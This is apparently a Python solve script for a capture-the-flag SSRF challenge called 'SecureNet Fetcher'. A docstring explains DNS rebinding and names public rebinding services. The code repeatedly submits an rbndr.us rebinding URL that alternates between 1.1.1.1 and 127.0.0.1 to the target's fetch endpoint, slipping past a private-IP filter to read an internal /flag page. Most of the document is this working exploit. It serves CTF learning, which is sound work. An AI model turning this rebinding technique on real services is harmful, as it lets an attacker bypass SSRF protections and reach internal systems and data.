#!/usr/bin/env python3
"""
============================================================
DNS REBINDING ATTACK — SOLVE SCRIPT
SSRF CTF Challenge: SecureNet Fetcher
============================================================

HOW DNS REBINDING WORKS (in this challenge):
--------------------------------------------
1. The victim server (SecureNet Fetcher) checks your URL:
   - It resolves the domain via DNS → gets PUBLIC IP → PASSES check ✅
   - Then it tries to make the actual HTTP request (re-resolves DNS)
   - If the domain's TTL is ~0 and you swap DNS to 127.0.0.1 → BYPASSES filter ✅

ATTACK SETUP:
-------------
You need a DNS server that:
  - First returns a real public IP for your domain (e.g., 1.2.3.4)
  - Then (after the first lookup) switches to 127.0.0.1
  - Uses TTL=0 so the response isn't cached

STEP-BY-STEP ATTACK:
--------------------
Option A: Use a DNS Rebinding service (rebind.it, rbndr.us)
  - Format: <external-ip-hex>.<internal-ip-hex>.rbndr.us
  - Example: For external IP 1.2.3.4 and internal 127.0.0.1:
    1.2.3.4 hex = 01020304
    127.0.0.1 hex = 7f000001
    Domain: 01020304.7f000001.rbndr.us
  - This domain alternates between both IPs on each DNS query!

Option B: Custom DNS server (singularity, etc.)
  - Set up singularity (https://github.com/nccgroup/singularity)
  - Configure it to rebind to 127.0.0.1:8080

Option C: rbndr.us (easiest for the challenge):
  - Submit: http://c0a80001.7f000001.rbndr.us:8080/flag
    (note: may need to try multiple times due to alternating nature)

AUTOMATED SOLVE WITH rbndr.us:
--------------------------------
The script below automates retrying the submission until DNS rebinding succeeds.
"""

import requests
import time
import json
import sys

TARGET = "http://localhost:3000"  # Change to challenge URL

# rbndr.us alternates between two IPs per query with TTL=0
# Format: <ip1-hex>.<ip2-hex>.rbndr.us
# First IP: some public IP (or anything), Second IP: 127.0.0.1 (7f000001)
# We use Cloudflare 1.1.1.1 (01010101) as the decoy public IP
REBIND_DOMAIN = "01010101.7f000001.rbndr.us"
FLAG_PATH = "/flag"
INTERNAL_PORT = 8080

REBIND_URL = f"http://{REBIND_DOMAIN}:{INTERNAL_PORT}{FLAG_PATH}"

print(f"""
╔══════════════════════════════════════════════════════╗
║         DNS REBINDING EXPLOIT — SECE CTF             ║
╚══════════════════════════════════════════════════════╝

Target:     {TARGET}
Rebind URL: {REBIND_URL}

Strategy: rbndr.us alternates DNS responses between 1.1.1.1 and 127.0.0.1
          with TTL=0. When the server's DNS check hits → gets 1.1.1.1 (public → pass)
          When the actual HTTP connection resolves → gets 127.0.0.1 → internal access!

Note: This is probabilistic. May need multiple attempts.
      The timing window is ~50-200ms between DNS check and HTTP connection.
""")

def attempt_fetch(url):
    try:
        resp = requests.post(
            f"{TARGET}/api/fetch",
            json={"url": url},
            timeout=10
        )
        return resp.json()
    except Exception as e:
        return {"success": False, "error": str(e)}

max_attempts = 50
print(f"[*] Starting {max_attempts} attempts (DNS rebinding is probabilistic)...\n")

for i in range(1, max_attempts + 1):
    print(f"[{i:02d}] Attempting: {REBIND_URL}", end=" ")
    result = attempt_fetch(REBIND_URL)

    if result.get("success"):
        body = result.get("body", "")
        if "SECE{" in body:
            import re
            flag = re.search(r'SECE\{[^}]+\}', body)
            if flag:
                print(f"\n\n{'='*60}")
                print(f"  🎉 FLAG CAPTURED!")
                print(f"  {flag.group()}")
                print(f"{'='*60}\n")
                sys.exit(0)
        print(f"→ SUCCESS (HTTP {result.get('status')}) but no flag in body")
        print(f"  Body: {body[:200]}")
    else:
        err = result.get("error", "unknown")
        if "DNS" in err or "SSRF" in err or "private" in err.lower():
            print(f"→ BLOCKED (DNS resolved to internal IP during check)")
        elif "timed out" in err.lower() or "ECONNREFUSED" in err.lower():
            print(f"→ TIMEOUT/REFUSED (IP rotated but server didn't respond in time)")
        else:
            print(f"→ ERROR: {err[:80]}")

    # Small delay between attempts
    time.sleep(0.5)

print(f"\n[!] Exhausted {max_attempts} attempts. Tips:")
print("    - Ensure the challenge server has no DNS caching")
print("    - Try a custom singularity-based DNS rebinder for better control")
print("    - Check that internal port 8080 is running correctly")
